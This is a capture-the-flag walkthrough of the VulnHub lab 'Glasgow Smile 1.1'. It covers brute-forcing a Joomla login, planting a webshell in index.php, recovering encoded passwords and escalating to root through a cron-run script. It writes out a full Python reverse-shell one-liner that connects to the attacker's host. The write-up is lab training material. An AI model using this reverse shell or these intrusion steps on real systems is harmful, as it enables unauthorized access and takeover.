<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Glasgow Smile: 1.1 Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/glasgow-smile-1-1-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-06-22T17:55:01+00:00">June 22, 2020</time><time class="updated" datetime="2025-06-10T20:10:27+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another boot2root challenge called “Glasgow Smile”. It’s available at Vulnhub for penetration testing. This lab is an intermediate level. The credit for making this lab goes to <strong><a style="color: #000000;" href="https://twitter.com/mindsflee">mindsflee</a></strong>. Let’s get started and learn how to break it down successfully.</span></p>
<p><span style="color: #000000;">Level: <strong>Intermediate</strong></span></p>
<p><span style="color: #000000;">Since these labs are available on the Vulnhub website. Let’s download the lab file from <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/glasgow-smile-11,491/">here</a></strong>.</span></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodology</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Netdiscover</strong></span></li>
<li><span style="color: #000000;"><strong>Nmap</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Gobuster</strong></span></li>
<li><span style="color: #000000;"><strong>Joomscan</strong></span></li>
<li><span style="color: #000000;"><strong>CyberChef</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>CeWL</strong></span></li>
<li><span style="color: #000000;"><strong>Brute force Joomla login with Burp</strong></span></li>
<li><span style="color: #000000;"><strong>Credential theft from the database</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Pspy</span></li>
<li><span style="color: #000000;">Abuse of crontab tasks</span></li>
</ul>
<ul>
<li><span style="color: #000000;"><strong>Capture the flag</strong></span></li>
</ul>
<h3><span style="color: #800000;"><strong>Walkthrough</strong></span></h3>
<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
<p><span style="color: #000000;">As always we identify the host’s IP with the “Netdiscover” tool:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gcP8yO4thE0/XvDqmFE6CaI/AAAAAAAAk_k/W4iswt5dNekHeak_WN4qreKQJUNBqw5pACLcBGAsYHQ/s1600/1.png"/></span></p>
<p><span style="color: #000000;">So, let’s start by listing all the TCP ports with nmap.</span></p>
<pre class="lang:default decode:true">nmap -A -p- 192.168.10.162</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A8QFslvMTpA/XvDqqf2rZrI/AAAAAAAAk_o/Kr9R0-XwlSgvw4cbEsg8djYGs1jKbH-QQCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">We start by visiting the web service (port 80), we find the image of the “Joker”, we check the source code and the robot.txt file, it seems that there is nothing useful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8V_g7KYiJHk/XvDqwYVwHkI/AAAAAAAAk_s/q-mxvBW-4hECFG8BodSqWqHkNMLEF6xgACLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">With the help of Gobuster and the “<strong>big</strong>” dictionary (default in kali), we found the <strong>Joomla</strong> <strong>CMS</strong> deployed on the server:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-J_A6SdRZ0Y0/XvDq1zLBSnI/AAAAAAAAk_w/kli7ii50IfEmHUW45CF1NdiTyLisRa3MQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">We access the site and show the Joomla site with only one post on it, where there is a dialogue of two scenes from the film of the “<strong>Joker</strong>“</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EEduTffHRwM/XvDrCIEqOkI/AAAAAAAAlAA/LCoWl5-spgwwYtWtJ539OrOSEvMX-l9HgCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">It’s time to use “<strong>joomscan</strong>” and list version, interesting directories, backup files or something that can help us identify some vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-c-yVGDGNWSE/XvDrIaoPdCI/AAAAAAAAlAI/TaLQNOfp6HIMpIJ6Mz0P13iMWzyc5TyIACLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nnAv6LlUIwY/XvDrScnI7hI/AAAAAAAAlAU/2ySSKEbUQVUjaKn0U-Uk1xM5SlzeiZTpACLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">To work more comfortably, I always recommend that you modify the <strong>/etc/hosts/</strong> with the name of the machine. In many cases, this host will be shown to you in the site’s own source code. (Although this step is not necessary on this machine)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NRYlC8iFekA/XvDrWUUuzGI/AAAAAAAAlAY/o_w1p0MgsiEVZFTUm6bLRZWs0OhaZwahgCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Exploiting</span></p>
<p><span style="color: #000000;">We run <strong>CeWL</strong> to create a custom dictionary using the words from the Joker/Arthur dialogue posted in Joomla.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JFtvWjElOF0/XvDrbzyxb0I/AAAAAAAAlAk/UtETEyQiquIVJ4-xPHWx9QBvH_gD7jHbACLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">We capture with <strong>Burp</strong> a request of the authentication request and take it to the “<strong><u>intruder</u></strong>” and introduce the dictionary we just created.” (You have a good tutorial about Bruteforce login with Burp <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/brute-force-website-login-page-using-burpsuite/">here</a></strong></span>)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-487cDGDopek/XvDriLbeo3I/AAAAAAAAlAs/Ff25-Y-l7Y4HWrzuEfPVZ1y9SlmMQWfPwCLcBGAsYHQ/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We start the attack, filter through “<strong>Lenght</strong>” and find a single line where its value is different. There are our credentials!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-HSulML6htA0/XvDrn16mZFI/AAAAAAAAlA0/qoeFpostq3cX8BFTNp6DEqypQ8nejnJWwCLcBGAsYHQ/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We check our credentials in the Joomla administration panel, we see that we are in as “<strong>Super Admin (Joker)</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-CrOGv-TbpgQ/XvDruKdsySI/AAAAAAAAlA4/DJMX6tnKMR8GI3S8PJWSPeh8MqStaJK_QCLcBGAsYHQ/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Our site step will be to get up a reverse shell or webshell in order to have visibility inside the server.</span></p>
<p><span style="color: #000000;">To do this, I didn’t get complicated, I directly modified the file “<strong>index.php</strong>” and put the code of the webshell of “<strong>pentestmonkey</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rJBI7sBiDxA/XvDrz9CnqJI/AAAAAAAAlA8/NOZJnv-vrGQsc0U8zEcLOxI7G6JdaTmQwCLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Great! Now, we’ll put a listening netcat on port 5555 and run the command to create a reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cURf9oVOdu4/XvDr7CYqYvI/AAAAAAAAlBE/9e7BZPGh0NgpYB_V_1LEQp7AQklQPT_mgCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We run the path of the “<strong>index.php</strong>“:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IAHQ-QQPQVg/XvDsAEecO6I/AAAAAAAAlBM/Sw7Thdoiekcxs9zLSY5CCyjNDkIhu6iMACLcBGAsYHQ/s1600/15.png"/></span></p>
<p><span style="color: #000000;">If everything went well, we will have a reverse shell with the user “www-data”.</span></p>
<p><span style="color: #000000;">We execute the following commands to get an interactive shell. Once inside, we read the “Joomla” configuration file and get the credentials from the database. (There are always interesting things in the databases :D)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kl5gP6PIH90/XvDsEINAl7I/AAAAAAAAlBU/2_L316P_CBky3lE2VqlhTPCg0xYU4IfvACLcBGAsYHQ/s1600/16.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation (user “rob”)</strong></span></h3>
<p><span style="color: #000000;">We logged on to the database, from the “<strong>batjoke</strong>” database and we will query the “<strong>taskforce</strong>” table. We make a query and see that there are several users with their passwords encoded in <strong><u>base64</u></strong>, we will only keep the user “<strong>rob</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UibLliceAz8/XvDsKPmx4vI/AAAAAAAAlBY/pcrYDAZdpYQjolOXyJQMJPngCDmEzC-pwCLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We decode the password from our kali and get the credentials in plain text.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UrurLf_e2zI/XvDsQwAaycI/AAAAAAAAlBk/wo31NRuexPsFlG7eCbAwZbJGkdreuU1qQCLcBGAsYHQ/s1600/22.png"/></span></p>
<p><span style="color: #000000;">We test the credentials from the SSH service and log in with the user “<strong>rob</strong>” And we can read the first flag:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cifu3-ENkUo/XvDsWiBpgFI/AAAAAAAAlBs/KkhI1EE0Sj0hLjlE02HKxkUbejnBZLXKQCLcBGAsYHQ/s1600/23.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation (user “Abner”)</strong></span></h3>
<p><span style="color: #000000;">Inside the “home” of the user “<strong>rob</strong>” we find the file “<strong>Abnerineedyourhelp</strong>“. We read it and we will have the clue to get the credentials of the next user.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jez4Yg7wjwQ/XvDsbjtpSQI/AAAAAAAAlB0/g3kCwNK-1lAPJaBG0cyKWV2VYMpv1bM4gCLcBGAsYHQ/s1600/24.png"/></span></p>
<p><span style="color: #000000;">With the help of the “<strong><a style="color: #000000;" href="https://gchq.github.io/CyberChef/">Cyberchef</a></strong>” website and the “<strong><u>rot13</u></strong>” module. We will be modifying the value until we get the readable text.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nwwDFIkYQIs/XvDshd11ivI/AAAAAAAAlB4/Rh9XJVIfo-AMPAQ1N0-wHueivrXCNJ00QCLcBGAsYHQ/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We repeat the previous formula, decode the password in <strong>base64</strong> and obtain the password of the user “<strong>abner</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QgNB8dAK-Is/XvDsmfCJJiI/AAAAAAAAlCA/PlSOcELCMbIqy2RyagaCKZvFmQgShrRNwCLcBGAsYHQ/s1600/26.png"/></span></p>
<p><span style="color: #000000;">We authenticate ourselves as the new user and with it, the next flag:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-YSThY_Li2no/XvDswWx75VI/AAAAAAAAlCE/1q3QnjZauLM_L84iksiWN4D9l4W3g5O_wCLcBGAsYHQ/s1600/27.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation (user “Penguin”)</strong></span></h3>
<p><span style="color: #000000;">It is probably the most complicated user to get, since I focused on scaling user privileges, without finishing listing everything that was in the different folders of <strong>Joomla</strong>. For example, this <u><strong>hidden</strong> <span style="color: #000000;"><strong>zip</strong></span></u>:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lwd-HM59OrE/XvDs2v5vNRI/AAAAAAAAlCM/mbx_bUn73UMMyddnJXN4aQwrx4xs6ijCQCLcBGAsYHQ/s1600/28.png"/></span></p>
<p><span style="color: #000000;">Download and unzip the .zip file using the user’s password “<strong>abner</strong>” (remember: <em>I33hope99my0death000makes44more8cents00than0my0life0</em>)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S6f9-daH4-8/XvDs_E4I2EI/AAAAAAAAlCQ/ihc8R7DJxfIQWgsWlHNb3u_f2qkTmv57wCLcBGAsYHQ/s1600/29.png"/></span></p>
<p><span style="color: #000000;">We read the file and obtain the credentials of the user “<strong>penguin</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PeqpAVLd5po/XvDtD129m0I/AAAAAAAAlCY/4vz1wmEheIIY4XF1MZ6kxgfL-3TeQHqWgCLcBGAsYHQ/s1600/30.png"/></span></p>
<p><span style="color: #000000;">We authenticate with the new user “<strong>penguin</strong>” and we read the flag located in his “<strong>home</strong>“:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I09Tods2BrI/XvDtHLuxQWI/AAAAAAAAlCc/o5fpWdrNPccy4k-gki7AstQ5vLlHgITUwCLcBGAsYHQ/s1600/31.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation (root)</strong></span></h3>
<p><span style="color: #000000;">After getting to climb over the three users, now it’s time to get the desired “root”.</span></p>
<p><span style="color: #000000;">We read the file “<strong>PeopleAreStartingToNotice</strong>” (Make some coffee, you’ll need it! xD)</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iM-zggFIcAc/XvDtNd0TkaI/AAAAAAAAlCg/Yg_fquQOj7AVlW2y7ONqju9XjGiQacsOQCLcBGAsYHQ/s1600/32.png"/></span></p>
<p><span style="color: #000000;">The Joker tells us that it is developing a program (binary find) and that it can only be executed with root permissions… Well, I’m going to save you time, since this binary is useless xD</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RNwFSETEins/XvDtTTI6edI/AAAAAAAAlCk/3pRz7cuDTzoYgnLAJn8UMDEXjBZHuH-RwCLcBGAsYHQ/s1600/33.png"/></span></p>
<p><span style="color: #000000;">We focus on the hidden file “<strong>.trash_old</strong>“.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dLZC4B6pwmQ/XvDtZimbSAI/AAAAAAAAlCs/FnKMKstfmdQWgoHOLxSb_l_FrmBViZ4FACLcBGAsYHQ/s1600/34.png"/></span></p>
<p><span style="color: #000000;">I gave it a lot of thought, this “Joker” was playing with me and I didn’t know where to climb, until <strong><a style="color: #000000;" href="https://github.com/DominicBreuker/pspy">Pspy</a></strong> gave me the answer…</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UntHsTryN6A/XvDteBqiBmI/AAAAAAAAlCw/ASldtsLctLYi0oGN6RnhWA0whNMC_zd3ACLcBGAsYHQ/s1600/35.png"/></span></p>
<p><span style="color: #000000;">With this, it was already easy, we would only have to modify the file and add our line with a reverse python shell.</span></p>
<pre class="lang:default decode:true  ">python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.155",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kg_DxbTy4tg/XvDtmPwQDiI/AAAAAAAAlC4/mH3sZqKCR4MKtyDKZlgNW0sSS7DG6OpZwCLcBGAsYHQ/s1600/36.png"/></span></p>
<p><span style="color: #000000;">We put a listening <strong>netcat</strong> on our kali at port <strong>8888</strong>:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0oUzNRM7YMw/XvDtrDLmf4I/AAAAAAAAlDA/sFDQ-lkw2xoe2eltciv29O7fGx4vnU7UwCLcBGAsYHQ/s1600/37.png"/></span></p>
<p><span style="color: #000000;">We wait a few minutes and see how the script runs in crontab:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZK5mjgTzkhY/XvDt1q8ZQlI/AAAAAAAAlDQ/-Er8vz6YPQ0ESV4wCTeAB5FlRVGoKqTgwCLcBGAsYHQ/s1600/38.png"/></span></p>
<p><span style="color: #000000;">And if all goes well, we’ll have a shell as <strong>root</strong> in our kali:</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-39U27kh26z4/XvDt50iDX5I/AAAAAAAAlDU/prSxRJoryIsKCnNOzaiwgzJyEUSWt7kIQCLcBGAsYHQ/s1600/39.png"/></span></p>
<p><span style="color: #000000;">Perfect! Now, all we have to do is read the root flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vemSIMr4BjA/XvDt90p6E8I/AAAAAAAAlDc/YTxjlM36mTAmHHomdABSOwSugUIct97BwCLcBGAsYHQ/s1600/40.png"/></span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks </span><span style="color: #000000;">Contacted on <strong>LinkedIn</strong>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
